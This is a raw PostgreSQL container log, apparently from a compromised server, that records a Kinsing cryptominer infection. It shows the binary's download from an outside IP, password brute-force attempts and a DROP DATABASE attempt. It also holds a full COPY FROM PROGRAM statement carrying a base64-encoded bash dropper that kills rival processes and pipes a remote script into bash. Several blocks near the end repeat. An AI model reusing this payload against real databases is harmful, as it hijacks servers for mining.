+postgres-1  | chattr: can't stat '/etc/ld.so.preload': No such file or directory
+postgres-1  | rm: can't remove '/opt/atlassian/confluence/bin/1.sh': No such file or directory
+postgres-1  | rm: can't remove '/opt/atlassian/confluence/bin/1.sh.1': No such file or directory
+postgres-1  | rm: can't remove '/opt/atlassian/confluence/bin/1.sh.2': No such file or directory
+postgres-1  | rm: can't remove '/opt/atlassian/confluence/bin/1.sh.3': No such file or directory
+postgres-1  | rm: can't remove '/opt/atlassian/confluence/bin/3.sh': No such file or directory
+postgres-1  | rm: can't remove '/opt/atlassian/confluence/bin/3.sh.1': No such file or directory
+postgres-1  | rm: can't remove '/opt/atlassian/confluence/bin/3.sh.2': No such file or directory
+postgres-1  | rm: can't remove '/opt/atlassian/confluence/bin/3.sh.3': No such file or directory
+postgres-1  | rm: can't remove '/var/tmp/lib': No such file or directory
+postgres-1  | rm: can't remove '/var/tmp/.lib': No such file or directory
+postgres-1  | chattr: can't stat '/tmp/lok': No such file or directory
+postgres-1  | chmod: /tmp/lok: No such file or directory
+postgres-1  | bash: line 614: docker: command not found
+postgres-1  | bash: line 615: docker: command not found
+postgres-1  | bash: line 616: docker: command not found
+postgres-1  | bash: line 617: docker: command not found
+postgres-1  | bash: line 618: docker: command not found
+postgres-1  | bash: line 619: docker: command not found
+postgres-1  | bash: line 620: docker: command not found
+postgres-1  | bash: line 621: docker: command not found
+postgres-1  | bash: line 622: docker: command not found
+postgres-1  | bash: line 623: docker: command not found
+postgres-1  | bash: line 624: docker: command not found
+postgres-1  | bash: line 625: docker: command not found
+postgres-1  | bash: line 626: docker: command not found
+postgres-1  | bash: line 627: docker: command not found
+postgres-1  | bash: line 628: docker: command not found
+postgres-1  | bash: line 629: docker: command not found
+postgres-1  | bash: line 630: docker: command not found
+postgres-1  | bash: line 631: docker: command not found
+postgres-1  | bash: line 632: docker: command not found
+postgres-1  | bash: line 633: docker: command not found
+postgres-1  | bash: line 634: docker: command not found
+postgres-1  | bash: line 635: docker: command not found
+postgres-1  | bash: line 636: setenforce: command not found
+postgres-1  | bash: line 637: /etc/selinux/config: No such file or directory
+postgres-1  | bash: line 638: service: command not found
+postgres-1  | bash: line 639: systemctl: command not found
+postgres-1  | bash: line 640: service: command not found
+postgres-1  | bash: line 641: systemctl: command not found
+postgres-1  | md5sum: can't open '/tmp/kinsing': No such file or directory
+postgres-1  | /tmp/kinsing is not b3039abf2ad5202f4a9363b418002351, actual
+postgres-1  | chmod: /tmp/kinsing: No such file or directory
+postgres-1  | Connecting to 78.153.140.66 (78.153.140.66:80)
+postgres-1  | saving to '/tmp/kinsing'
+postgres-1  | kinsing               19% |******                          | 1129k  0:00:04 ETA
+postgres-1  | kinsing               54% |*****************               | 3201k  0:00:01 ETA
+postgres-1  | kinsing               77% |************************        | 4493k  0:00:00 ETA
+postgres-1  | kinsing              100% |********************************| 5828k  0:00:00 ETA
+postgres-1  | '/tmp/kinsing' saved
+postgres-1  | /tmp/kinsing is b3039abf2ad5202f4a9363b418002351
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | crontab: must be suid to work properly
+postgres-1  | 2025-08-31 18:00:56.728 UTC [1015] ERROR:  program "echo IyEvYmluL2Jhc2gKcGtpbGwgLWYgenN2Ywpwa2lsbCAtZiBwZGVmZW5kZXJkCnBraWxsIC1mIHVwZGF0ZWNoZWNrZXJkCgpmdW5jdGlvbiBfX2N1cmwoKSB7CiAgcmVhZCBwcm90byBzZXJ2ZXIgcGF0aCA8PDwkKGVjaG8gJHsxLy8vLyB9KQogIERPQz0vJHtwYXRoLy8gLy99CiAgSE9TVD0ke3NlcnZlci8vOip9CiAgUE9SVD0ke3NlcnZlci8vKjp9CiAgW1sgeCIke0hPU1R9IiA9PSB4IiR7UE9SVH0iIF1dICYmIFBPUlQ9ODAKCiAgZXhlYyAzPD4vZGV2L3RjcC8ke0hPU1R9LyRQT1JUCiAgZWNobyAtZW4gIkdFVCAke0RPQ30gSFRUUC8xLjBcclxuSG9zdDogJHtIT1NUfVxyXG5cclxuIiA+JjMKICAod2hpbGUgcmVhZCBsaW5lOyBkbwogICBbWyAiJGxpbmUiID09ICQnXHInIF1dICYmIGJyZWFrCiAgZG9uZSAmJiBjYXQpIDwmMwogIGV4ZWMgMz4mLQp9CgppZiBbIC14ICIkKGNvbW1hbmQgLXYgY3VybCkiIF07IHRoZW4KICBjdXJsIDc4LjE1My4xNDAuNjYvcGcuc2h8YmFzaAplbGlmIFsgLXggIiQoY29tbWFuZCAtdiB3Z2V0KSIgXTsgdGhlbgogIHdnZXQgLXEgLU8tIDc4LjE1My4xNDAuNjYvcGcuc2h8YmFzaAplbHNlCiAgX19jdXJsIGh0dHA6Ly83OC4xNTMuMTQwLjY2L3BnMi5zaHxiYXNoCmZp|base64 -d|bash" failed
+postgres-1  | 2025-08-31 18:00:56.728 UTC [1015] DETAIL:  child process exited with exit code 1
+postgres-1  | 2025-08-31 18:00:56.728 UTC [1015] STATEMENT:  DROP TABLE IF EXISTS whGOHPcZ;CREATE TABLE whGOHPcZ(cmd_output text);COPY whGOHPcZ FROM PROGRAM 'echo IyEvYmluL2Jhc2gKcGtpbGwgLWYgenN2Ywpwa2lsbCAtZiBwZGVmZW5kZXJkCnBraWxsIC1mIHVwZGF0ZWNoZWNrZXJkCgpmdW5jdGlvbiBfX2N1cmwoKSB7CiAgcmVhZCBwcm90byBzZXJ2ZXIgcGF0aCA8PDwkKGVjaG8gJHsxLy8vLyB9KQogIERPQz0vJHtwYXRoLy8gLy99CiAgSE9TVD0ke3NlcnZlci8vOip9CiAgUE9SVD0ke3NlcnZlci8vKjp9CiAgW1sgeCIke0hPU1R9IiA9PSB4IiR7UE9SVH0iIF1dICYmIFBPUlQ9ODAKCiAgZXhlYyAzPD4vZGV2L3RjcC8ke0hPU1R9LyRQT1JUCiAgZWNobyAtZW4gIkdFVCAke0RPQ30gSFRUUC8xLjBcclxuSG9zdDogJHtIT1NUfVxyXG5cclxuIiA+JjMKICAod2hpbGUgcmVhZCBsaW5lOyBkbwogICBbWyAiJGxpbmUiID09ICQnXHInIF1dICYmIGJyZWFrCiAgZG9uZSAmJiBjYXQpIDwmMwogIGV4ZWMgMz4mLQp9CgppZiBbIC14ICIkKGNvbW1hbmQgLXYgY3VybCkiIF07IHRoZW4KICBjdXJsIDc4LjE1My4xNDAuNjYvcGcuc2h8YmFzaAplbGlmIFsgLXggIiQoY29tbWFuZCAtdiB3Z2V0KSIgXTsgdGhlbgogIHdnZXQgLXEgLU8tIDc4LjE1My4xNDAuNjYvcGcuc2h8YmFzaAplbHNlCiAgX19jdXJsIGh0dHA6Ly83OC4xNTMuMTQwLjY2L3BnMi5zaHxiYXNoCmZp|base64 -d|bash';SELECT * FROM whGOHPcZ;DROP TABLE IF EXISTS whGOHPcZ;
+postgres-1  | 2025-08-31 18:31:50.575 UTC [3997] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 18:31:50.575 UTC [3997] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 18:31:50.748 UTC [3998] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 18:31:50.748 UTC [3998] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 18:32:05.953 UTC [4001] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 18:32:05.953 UTC [4001] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 18:32:06.124 UTC [4002] FATAL:  password authentication failed for user "postgres"
+postgres-1  | 2025-08-31 18:32:06.124 UTC [4002] DETAIL:  Password does not match for user "postgres".
+postgres-1  |   Connection matched pg_hba.conf line 99: "host all all all md5"
+postgres-1  | 2025-08-31 18:32:07.418 UTC [4007] FATAL:  database "template0" is not currently accepting connections
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] ERROR:  cannot drop the currently open database
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] STATEMENT:  DROP DATABASE postgres;
+postgres-1  | 2025-08-31 19:40:34.020 UTC [4290] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:44:37.335 UTC [4308] LOG:  invalid length of startup packet
+postgres-1  | 2025-08-31 19:46:36.949 UTC [4317] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:48:03.339 UTC [4324] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:51:58.722 UTC [4341] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:52:21.888 UTC [4343] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:52:46.270 UTC [4346] FATAL:  database "mila_db" does not exist
+root@cv5214786:~/health#
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] ERROR:  cannot drop the currently open database
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] STATEMENT:  DROP DATABASE postgres;
+postgres-1  | 2025-08-31 19:40:34.020 UTC [4290] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:44:37.335 UTC [4308] LOG:  invalid length of startup packet
+postgres-1  | 2025-08-31 19:46:36.949 UTC [4317] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:48:03.339 UTC [4324] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:51:58.722 UTC [4341] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:52:21.888 UTC [4343] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:52:46.270 UTC [4346] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] ERROR:  cannot drop the currently open database
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] STATEMENT:  DROP DATABASE postgres;
+postgres-1  | 2025-08-31 19:40:34.020 UTC [4290] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:44:37.335 UTC [4308] LOG:  invalid length of startup packet
+postgres-1  | 2025-08-31 19:46:36.949 UTC [4317] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:48:03.339 UTC [4324] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:51:58.722 UTC [4341] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:52:21.888 UTC [4343] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] ERROR:  cannot drop the currently open database
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] STATEMENT:  DROP DATABASE postgres;
+postgres-1  | 2025-08-31 19:40:34.020 UTC [4290] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:44:37.335 UTC [4308] LOG:  invalid length of startup packet
+postgres-1  | 2025-08-31 19:46:36.949 UTC [4317] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:48:03.339 UTC [4324] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] ERROR:  cannot drop the currently open database
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] STATEMENT:  DROP DATABASE postgres;
+postgres-1  | 2025-08-31 19:40:34.020 UTC [4290] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:44:37.335 UTC [4308] LOG:  invalid length of startup packet
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] ERROR:  cannot drop the currently open database
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] STATEMENT:  DROP DATABASE postgres;
+postgres-1  | 2025-08-31 19:40:34.020 UTC [4290] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:44:37.335 UTC [4308] LOG:  invalid length of startup packet
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] ERROR:  cannot drop the currently open database
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] STATEMENT:  DROP DATABASE postgres;
+postgres-1  | 2025-08-31 19:40:34.020 UTC [4290] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] ERROR:  cannot drop the currently open database
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] STATEMENT:  DROP DATABASE postgres;
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] ERROR:  cannot drop the currently open database
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] ERROR:  cannot drop the currently open database
+postgres-1  | 2025-08-31 18:32:08.736 UTC [4011] STATEMENT:  DROP DATABASE postgres;
+postgres-1  | 2025-08-31 19:40:34.020 UTC [4290] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:44:37.335 UTC [4308] LOG:  invalid length of startup packet
+postgres-1  | 2025-08-31 19:46:36.949 UTC [4317] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:48:03.339 UTC [4324] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:51:58.722 UTC [4341] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:52:21.888 UTC [4343] FATAL:  database "mila_db" does not exist
+postgres-1  | 2025-08-31 19:52:46.270 UTC [4346] FATAL:  database "mila_db" does not exist
